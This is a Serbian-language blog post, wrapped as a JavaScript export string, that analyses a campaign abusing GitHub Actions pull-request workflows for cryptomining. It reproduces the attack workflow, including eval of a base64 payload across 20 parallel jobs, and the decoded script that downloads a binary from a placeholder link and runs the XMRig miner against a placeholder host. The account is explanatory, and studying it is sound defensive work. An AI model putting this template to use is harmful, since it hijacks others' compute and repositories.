export default `
 <p>
  У мору наслова и чланака којима ме Гугл бомбардује сваки пут када отворим Хром, нашао се један који ми је привукао пажњу и који сам чак сачувао да сутра ујутру прочитам поново. 
  Ту ноћ сам се осећао као прави детектив са све моноклом док сам гледао приложене доказе догађаја. Одмах бих на почетку и похвалио аутора и приметио да је прилично имао искуства 
  са таквим догађајима и да је знао да ће у веома кратком року све то нестати и постати једна од многих недоступних 404 страница. На сву срећу то је све сачувано у формату текст - линк - снимак екрана.
 </p>

 <p>
  Дакле, ради се о томе да је неколико група људи користило Гитхаб акције на репозиторијумима за покретање програма, у овом случају за крипто рударење. 
  Требало је да се одраде само два корака, а то су: да се напише скрита која ће да се активира на захтев за спајање и потом да се направи тај захтев направи.
</p>
 <p>
   Скипта је изгледала отприлике овако:
 </p>
 <code>
 <pre>
name: Test
on: [pull_request]
jobs:
    test:
      name: Fetch
      runs-on: ubuntu-latest
      container: ubuntu:20.10
      strategy:
        fail-fast: false
        matrix:
          runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
        steps:
          - run: |
                eval "$(echo "BASE_64_ENCODED_STRING" | base64 -d)"
</pre>
 </code>
 <p>
  Оно што одмах може да се види да се користи максималан број апликација које покрећу послове. У овом случају може бити највише 20 конкурентних послова из тог разлога што Гитхаб бесплатни налог не дозвољава више.
  Што се тиче шифровања, овај начин је опште познат. У Јаваскрипту се једноставно може добити коришћењем функције <i>btoa</i>, а може се дешифровати функцијом <i>atob</i>.
 </p>
 <p>
 У овом случају, оно што је било шифровано је изгледало слично овоме:
 </p>

 <code>
 <pre>
apt update -qq
apt install -y curl jq
curl -Lfo prog LINK_TO_FILE_DOWNLOAD_LOCATION
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=DOMAIN_NAME' | jq -r '.Answer[0].data')
chmod u+x prog
timeout 4h ./prog -o "\${ip}:3000" -u username -p password --cpu-priority 5 > /dev/null
</pre>
</code>

 <p>
  Прилично је познато шта се догађа у овој скрипти која ће да се изврши:
 </p>

 <ul>
  <li>Инсталираће се све што је потребно овој скрипти да функционише</li>
  <li>Скинуће програм на машину</li>
  <li>Дохватиће IP адресу домена који му треба да би проследио као параметар програму</li>
  <li>Промениће права скинутом програму у складу са корисником који ће то да изрши</li>
  <li>Извршиће програм са прослеђеним параметрима</li>
 </ul>

 <p>
  Даљим истраживањем скинутог фајла могло је да се види да је <i>prog</i> у ствари програм за крипто рударење <a href="https://github.com/xmrig/xmrig" target="new">XMRig</a>.
 </p>

 <code>
  <pre>
./prog --version

XMRig 6.8.1
 built on Feb 03 2021 with GCC 10.2.1
 features: 64-bit AES
</pre>
 </code>

 <p>
 Одатле су потекли разни наслови да се врше напади и да то раде организоване групе хакера. Сами власници репозиторијума нису били претерано оштећени осим што им је пристигло много мејлова од Гитхаба како је 
 захтев за спајање отворен, па затворен и тако у круг.
 </p>
 
 <p>
  Као прво, не бих се сложио са тим да су се на Гитхабу одвијали напади или да је неко нападао њихове сервере. То бих пре назвао злоупотребом. 
  Као друго не бих ни називао те људе хакерима и пре бих рекао да су искористили оно на чему сам Гитхаб потенцира, а то је да извршавају корисников код који је потпуно произвољан. 
  Гитхаб је дао могућност апсолутно свима да извршавају своје скрипте на својим виртуелним машинама само је потребно да направе бесплатан налог и напишу како ће акција да ради и када ће да се активира.
 </p>

 <p>
  Након успостављања контакта са службом подршке, све се на крају завршавало добро по власнике репозиторијума. 
  Лажни налози корисника који су терали акције да се активирају су били обрисани, а власници репозиторијума где се све то одвијало су за време док се проблем не реши једино могли да привремено онемогуће акције. 
 </p>

 <p>
  И није баш да су наши испамовани власници репозиторијума остали празних руку. Као успомена им је остао читав репозиторијум са јединственом историјом, а мислим да више и није потребно.
 </p>
`;